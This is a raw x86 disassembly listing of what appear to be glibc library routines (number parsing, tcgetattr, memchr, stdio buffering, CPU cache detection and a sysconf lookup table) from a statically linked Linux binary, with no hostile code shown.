cmp byte [var_1111h], 0
je 0x808a7a3
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808a7a3
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808c1c2
jmp 0x808a7a3
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a78b
mov ecx, esi
cmp cl, 0x30
jne 0x808a78f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x808c1f8
jmp 0x808a78f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x808a731
add edi, 2
mov dword [var_1078h], 0x10
movzx esi, byte [edi]
mov dword [var_10a4h], 0
jmp 0x808a731
lea esi, [esi]
test al, al
jne 0x808a54d
jmp 0x808a53d
mov edx, dword [var_109ch]
movzx eax, byte [edx]
jmp 0x808c240
inc edi
movzx esi, byte [edi]
jmp 0x808a504
mov dword [var_1074h], 1
jmp 0x808c258
push ebp
mov eax, 0x80aa9a4
mov ebp, esp
sub esp, 0x10
mov edx, dword [arg_10h]
mov dword [esp], 0
test edx, edx
cmovne eax, edx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
call fcn.08077900
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx]
movzx eax, byte [edx]
lea ecx, [eax - 0x30]
lea eax, [edx + 1]
mov dword [ebx], eax
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
ja 0x80745fd
mov edx, dword [ebx]
lea ecx, [ecx + ecx*4]
movzx eax, byte [edx]
lea ecx, [eax + ecx*2 - 0x30]
lea eax, [edx + 1]
mov dword [ebx], eax
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x80745e0
pop ebx
mov eax, ecx
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx]
mov ecx, dword [eax]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [ebx], edx
sub eax, 0x30
sub ecx, 0x30
cmp eax, 9
ja 0x8074afb
mov esi, esi
mov edx, dword [ebx]
lea ecx, [ecx + ecx*4]
mov eax, dword [edx]
lea ecx, [eax + ecx*2 - 0x30]
lea eax, [edx + 4]
mov dword [ebx], eax
mov eax, dword [edx + 4]
sub eax, 0x30
cmp eax, 9
jbe 0x8074ae0
pop ebx
mov eax, ecx
leave
ret
push ebp
mov ebp, esp
sub esp, 0x48
lea eax, [var_40h]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08079f40
test eax, eax
sete al
leave
movzx eax, al
ret
push ebp
mov ecx, 0x5401
mov ebp, esp
push edi
push ebx
lea edx, [var_38h]
sub esp, 0x3c
mov edi, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x36
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8079fc2
mov eax, dword [var_38h]
mov dword [edi], eax
mov eax, dword [var_34h]
mov dword [edi + 4], eax
mov edx, dword [var_30h]
mov dword [edi + 8], edx
and edx, 0x100f
mov eax, dword [var_2ch]
mov dword [edi + 0xc], eax
movzx eax, byte [var_28h]
mov dword [edi + 0x38], edx
mov dword [edi + 0x34], edx
mov byte [edi + 0x10], al
lea eax, [var_27h]
mov dword [var_8h], 0x13
mov dword [var_4h], eax
lea eax, [edi + 0x11]
mov dword [esp], eax
call fcn.08053740
mov ecx, 3
mov edi, eax
xor eax, eax
cld
rep stosd dword es:[edi], eax
mov byte [edi], 0
mov eax, ebx
add esp, 0x3c
pop ebx
pop edi
leave
ret
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x8079f66
push ebp
mov ebp, esp
sub esp, 4
mov dword [esp], 1
call fcn.0804e260
leave
ret
push ebp
mov ebp, esp
push esi
mov esi, 0x2000
push ebx
sub esp, 0x78
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x38]
test eax, eax
js 0x8074fc5
mov eax, dword [ebx + 0x94]
lea edx, [var_68h]
mov dword [esp], ebx
mov dword [var_4h], edx
call dword [eax + 0x48]
test eax, eax
js 0x8074fc5
mov eax, dword [var_58h]
and eax, 0xf000
cmp eax, 0x2000
je 0x8075033
mov eax, dword [var_34h]
test eax, eax
cmovg esi, eax
lea eax, [esi + 0xfff]
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
and eax, 0xfffff000
mov dword [var_ch], 0x22
mov dword [var_8h], 3
mov dword [var_4h], eax
mov dword [esp], 0
call fcn.080546d0
mov edx, eax
mov eax, 0xffffffff
cmp edx, 0xffffffff
je 0x807502c
lea eax, [esi + edx]
mov dword [var_ch], 1
mov dword [var_4h], edx
mov dword [var_8h], eax
mov dword [esp], ebx
call fcn.0804db40
mov eax, 1
add esp, 0x78
pop ebx
pop esi
leave
ret
mov edx, dword [var_44h]
mov eax, dword [var_48h]
shrd eax, edx, 8
shr edx, 8
mov ecx, eax
shrd eax, edx, 0x18
and ecx, 0xfff
and eax, 0xfffff000
or ecx, eax
sub ecx, 0x88
cmp ecx, 7
ja 0x8075069
or dword [ebx], 0x200
jmp 0x8074fbd
mov eax, dword [ebx + 0x38]
mov dword [esp], eax
call fcn.08079ee0
test eax, eax
je 0x8074fbd
jmp 0x807505e
push esi
push edi
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov esi, dword [arg_14h]
cmp esi, 4
jb 0x807737f
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
jmp 0x8077316
nop
lea esi, [esi]
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
mov ecx, dword [eax + 4]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a2
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a2
mov ecx, dword [eax + 8]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x807739f
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x807739f
mov ecx, dword [eax + 0xc]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x807739c
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x807739c
add eax, 0x10
sub esi, 0x10
jae 0x8077290
cmp esi, 0xfffffff4
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
cmp esi, 0xfffffff8
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
cmp esi, 0xfffffffc
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
and esi, 3
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
xor eax, eax
jmp 0x80773b8
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x80773b8
inc eax
test ch, ch
je 0x80773b8
inc eax
test ecx, 0xff0000
je 0x80773b8
inc eax
pop edi
pop esi
ret
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
or dword [eax], 0x100
mov eax, dword [eax + 0x58]
mov ebx, dword [eax + 4]
mov ecx, dword [eax + 0x28]
mov edx, dword [eax + 0x20]
mov dword [eax + 0x28], ebx
mov dword [eax + 4], ecx
mov dword [eax], ecx
mov ebx, dword [eax + 8]
mov dword [eax + 8], edx
mov dword [eax + 0x20], ebx
mov ebx, dword [esp]
leave
ret
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x1c
mov dword [var_10h], edx
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.080759c0
mov edx, dword [edi + 0x58]
mov ebx, dword [var_10h]
mov esi, eax
sub ebx, dword [edx + 8]
sar ebx, 2
sub ebx, eax
mov eax, dword [edx + 0x28]
sub eax, dword [edx + 0x20]
sar eax, 2
cmp ebx, eax
ja 0x8076305
sub eax, ebx
test esi, esi
mov dword [var_14h], eax
js 0x80762bd
test ebx, ebx
jne 0x8076299
mov eax, dword [edx + 0x20]
mov ecx, dword [var_14h]
mov ebx, dword [var_10h]
sub ebx, dword [edx + 8]
lea eax, [eax + ecx*4]
mov dword [edx + 0x24], eax
mov eax, dword [edi + 0x30]
mov edx, ebx
sar edx, 2
test eax, eax
je 0x807628f
sub dword [eax + 8], edx
mov eax, dword [eax]
test eax, eax
jne 0x8076286
xor eax, eax
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_8h], ebx
mov eax, dword [edx + 8]
lea eax, [eax + esi*4]
mov dword [var_4h], eax
mov eax, dword [edx + 0x20]
mov edx, dword [var_14h]
lea eax, [eax + edx*4]
mov dword [esp], eax
call fcn.080776d0
mov edx, dword [edi + 0x58]
jmp 0x8076268
mov eax, esi
mov ebx, dword [var_14h]
shl esi, 2
neg eax
mov dword [var_8h], eax
mov eax, dword [edx + 0x28]
shl ebx, 2
add eax, esi
mov dword [var_4h], eax
mov eax, dword [edx + 0x20]
add eax, ebx
mov dword [esp], eax
call fcn.08077700
mov eax, dword [var_10h]
mov edx, dword [edi + 0x58]
sub eax, dword [edx + 8]
sar eax, 2
mov dword [var_8h], eax
mov eax, dword [edx + 8]
mov dword [var_4h], eax
add ebx, dword [edx + 0x20]
sub ebx, esi
mov dword [esp], ebx
jmp 0x80762b3
lea eax, [ebx + 0x64]
mov dword [var_14h], 0x64
mov dword [var_1ch], eax
shl eax, 2
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_18h], eax
mov edx, dword [var_18h]
mov eax, 0xffffffff
test edx, edx
je 0x8076291
test esi, esi
js 0x8076380
mov eax, dword [edi + 0x58]
mov dword [var_8h], ebx
mov eax, dword [eax + 8]
lea eax, [eax + esi*4]
mov dword [var_4h], eax
mov eax, dword [var_18h]
add eax, 0x190
mov dword [esp], eax
call fcn.080776d0
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x20]
test eax, eax
jne 0x8076373
mov ecx, dword [var_18h]
mov ebx, dword [var_1ch]
lea eax, [ecx + ebx*4]
mov dword [edx + 0x20], ecx
mov dword [edx + 0x28], eax
jmp 0x8076268
mov dword [esp], eax
call fcn.08051180
mov edx, dword [edi + 0x58]
jmp 0x807635f
mov eax, esi
neg eax
mov dword [var_8h], eax
mov eax, dword [edi + 0x58]
mov eax, dword [eax + 0x28]
lea eax, [eax + esi*4]
mov dword [var_4h], eax
mov eax, dword [var_18h]
add eax, 0x190
mov dword [esp], eax
call fcn.080539d0
mov edx, dword [var_10h]
mov ecx, dword [edi + 0x58]
sub edx, dword [ecx + 8]
sar edx, 2
mov dword [var_8h], edx
mov edx, dword [ecx + 8]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080539d0
jmp 0x8076355
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [arg_10h]
mov edx, dword [arg_8h]
mov dword [esp], esi
mov dword [var_4h], edi
mov esi, dword [arg_ch]
cld
shl ecx, 2
mov edi, edx
mov eax, edx
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, dword [esp]
mov edi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp dword [ebx + 0x5c], 0
jl 0x8075ef1
je 0x8075ede
test byte [ebx + 1], 8
jne 0x8075ecc
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
cmp eax, dword [edx + 4]
jb 0x8075ec8
test byte [ebx + 1], 1
jne 0x8075eb6
mov ecx, dword [ebx + 0x30]
test ecx, ecx
jne 0x8075ea1
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x8075e97
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, eax
mov esi, esi
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [esp], ebx
call fcn.080761d0
jmp 0x8075e80
mov edx, dword [edx + 4]
mov eax, ebx
call fcn.08076220
mov edx, 0xffffffff
test eax, eax
je 0x8075e80
jmp 0x8075e90
mov dword [esp], ebx
call fcn.08075a00
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
cmp eax, dword [edx + 4]
jae 0x8075e72
mov edx, dword [eax]
jmp 0x8075e90
mov dword [esp], ebx
call fcn.08076150
mov edx, 0xffffffff
inc eax
jne 0x8075e62
jmp 0x8075e90
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
dec eax
je 0x8075ef8
mov edx, 0xffffffff
jmp 0x8075e90
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x8075e5c
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
jmp 0x8075e5c
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov eax, dword [edx + 0x58]
mov edx, dword [edx + 0x30]
sub ecx, dword [eax + 8]
sar ecx, 2
test edx, edx
je 0x80759ee
lea esi, [esi]
mov eax, dword [edx + 8]
mov edx, dword [edx]
cmp eax, ecx
cmovl ecx, eax
test edx, edx
jne 0x80759e0
mov eax, ecx
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, eax
mov eax, 0
test eax, eax
je 0x8053c9a
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8053c81
mov ecx, eax
mov edx, dword [ecx]
mov dword [esi], edx
mov eax, dword [ecx + 4]
mov dword [esi + 4], eax
mov eax, dword [ecx + 8]
mov dword [esi + 8], eax
mov eax, dword [ecx + 0xc]
mov dword [esi + 0xc], eax
mov eax, dword [edx]
test eax, eax
je 0x8053c6d
inc dword [edx + 8]
mov eax, dword [esi + 8]
mov ebx, dword [eax]
test ebx, ebx
je 0x8053c79
inc dword [eax + 8]
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
cmp ebx, 0x809ff60
mov ecx, 0x8092dec
je 0x8053c4e
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8053c4c
mov eax, dword [0x80a9ab4]
jmp 0x8053c43
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_18h]
mov dword [var_14h], 0
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808db40
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov ebx, dword [arg_1ch]
mov eax, dword [arg_ch]
mov esi, dword [arg_10h]
test ebx, ebx
mov dword [var_10h], eax
je 0x808db62
mov edx, dword [arg_1ch]
mov dword [edx], 0
mov eax, dword [arg_8h]
mov ecx, dword [eax + 0x5c]
test ecx, ecx
je 0x808dc7e
test esi, esi
je 0x808dbc8
mov edx, dword [arg_8h]
mov ebx, dword [edx + 8]
mov edi, dword [edx + 4]
sub ebx, edi
test ebx, ebx
jle 0x808dc15
mov eax, dword [arg_14h]
cmp ebx, esi
mov dword [esp], edi
cmovae ebx, esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
call fcn.08077220
test eax, eax
mov dword [var_14h], eax
jne 0x808dbd6
mov eax, dword [var_10h]
mov dword [var_8h], ebx
mov dword [var_4h], edi
sub esi, ebx
mov dword [esp], eax
call fcn.08053770
add dword [var_10h], ebx
mov edx, dword [arg_8h]
add dword [edx + 4], ebx
test esi, esi
jne 0x808db74
mov eax, dword [var_10h]
sub eax, dword [arg_ch]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov ebx, eax
mov esi, dword [var_10h]
mov eax, dword [arg_18h]
sub esi, dword [arg_ch]
sub ebx, edi
test eax, eax
js 0x808dbf4
inc dword [var_14h]
lea eax, [ebx + 1]
cmp dword [arg_18h], 1
cmovge ebx, eax
mov edx, dword [var_10h]
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edx
call fcn.08053770
mov eax, dword [arg_8h]
mov edx, dword [var_14h]
mov dword [eax + 4], edx
lea eax, [ebx + esi]
jmp 0x808dbce
mov dword [esp], edx
call fcn.0804da90
cmp eax, 0xffffffff
je 0x808dc65
cmp eax, dword [arg_14h]
je 0x808dc33
mov edx, dword [var_10h]
dec esi
mov byte [edx], al
inc edx
mov dword [var_10h], edx
jmp 0x808dbc4
cmp dword [arg_18h], 0
jle 0x808dc48
movzx edx, byte [arg_14h]
mov eax, dword [var_10h]
mov byte [eax], dl
inc eax
mov dword [var_10h], eax
jmp 0x808dbc8
jge 0x808dbc8
mov edx, dword [arg_14h]
mov eax, dword [arg_8h]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0804e190
jmp 0x808dbc8
mov edx, dword [arg_1ch]
test edx, edx
je 0x808dbc8
mov eax, dword [arg_1ch]
mov dword [eax], 0xffffffff
jmp 0x808dbc8
mov dword [eax + 0x5c], 0xffffffff
jmp 0x808db70
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov ebx, dword [arg_ch]
mov edi, dword [arg_8h]
test ebx, ebx
js 0x8078a17
lea ecx, [edi - 0xb9]
mov edx, 0x55555556
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
sub edx, eax
test ebx, ebx
lea esi, [edx + edx*2 + 0xb9]
je 0x8078a15
movzx eax, bl
cmp eax, 0x40
je 0x8078a44
mov dword [var_2ch], eax
mov dword [var_10h], 0x8078970
mov dword [var_ch], 0x14
lea eax, [var_2ch]
mov dword [var_8h], 0x1f
mov dword [var_4h], 0x80a2ea0
mov dword [esp], eax
call fcn.08062e40
test eax, eax
je 0x8078a10
mov edx, dword [eax + 4]
cmp edx, esi
je 0x8078a27
cmp edx, 0xbf
je 0x8078a1f
nop
shr ebx, 8
jne 0x80789c6
xor eax, eax
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_ch]
mov byte [eax], 1
jmp 0x8078a10
sub edi, edx
je 0x8078a3f
cmp edi, 1
je 0x8078a3a
cmp edi, 2
jne 0x8078a54
mov eax, dword [eax + 0x10]
jmp 0x8078a17
mov eax, dword [eax + 0xc]
jmp 0x8078a17
mov eax, dword [eax + 8]
jmp 0x8078a17
mov eax, dword [arg_14h]
cmp esi, 0xc2
mov byte [eax], 1
jne 0x8078a10
jmp 0x8078a15
mov dword [var_ch], str.intel_check_word
mov dword [var_8h], 0xad
mov dword [var_4h], str..._sysdeps_unix_sysv_linux_i386_sysconf.c
mov dword [esp], str.offset__2
call fcn.0805efc0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
cmp dword [var_8h], 1
jbe 0x8078b60
mov dword [var_18h], 1
mov byte [var_dh], 0
mov byte [var_eh], 0
mov dword [var_14h], 1
lea edi, [var_dh]
lea esi, [var_eh]
nop
mov eax, 2
xchg ebx, ebx
cpuid
xchg ebx, ebx
cmp dword [var_14h], 1
mov dword [var_20h], edx
mov dword [var_1ch], ecx
je 0x8078b71
mov ecx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], eax
mov dword [esp], ecx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], ebx
mov dword [esp], eax
call fcn.08078990
test eax, eax
jne 0x8078b62
mov edx, dword [var_1ch]
mov ecx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], edx
mov dword [esp], ecx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_20h]
mov edx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_14h]
inc dword [var_14h]
cmp eax, dword [var_18h]
jb 0x8078ab0
mov eax, dword [var_4h]
sub eax, 0xbf
cmp eax, 5
ja 0x8078b60
cmp byte [var_dh], 0
jne 0x8078b6a
nop
xor eax, eax
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
mov eax, 0xffffffff
jmp 0x8078b62
movzx edx, al
xor al, al
mov dword [var_18h], edx
jmp 0x8078acb
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
cmp eax, 0xc6
ja case.0x8078ecd.41
jmp dword [eax*4 + 0x80a3164]
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
leave
ret
mov eax, 0x20000
jmp 0x8078ee4
mov eax, 0x3e7
jmp 0x8078ee4
leave
jmp loc.0807ac30
mov eax, 0x20
jmp 0x8078ee4
leave
jmp loc.0807a020
mov eax, 0x10
jmp 0x8078ee4
call fcn.0808dee0
cmp eax, 6
jle 0x8078f1e
leave
jmp fcn.0808dee0
mov eax, 6
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x14
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x8000
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
leave
jmp fcn.080546b0
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x100
jmp 0x8078ee4
mov eax, 0x63
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x63
jmp 0x8078ee4
mov eax, 0x3e8
jmp 0x8078ee4
mov eax, 0xff
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x100
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 4
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x4000
jmp 0x8078ee4
mov eax, 0x4000
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
leave
jmp fcn.0807a930
leave
jmp fcn.0807a930
leave
jmp fcn.0807ac10
leave
jmp fcn.0807ac20
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x2000
jmp 0x8078ee4
mov eax, 0x1f4
jmp 0x8078ee4
mov eax, 4
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 8
jmp 0x8078ee4
mov eax, 0x7f
jmp 0x8078ee4
mov eax, 0xffffff80
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x80000000
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x10
jmp 0x8078ee4
mov eax, 0x14
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0x7f
jmp 0x8078ee4
mov eax, 0xffffff80
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0xffff8000
jmp 0x8078ee4
mov eax, 0xff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffff
jmp 0x8078ee4
mov eax, 0x1000
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
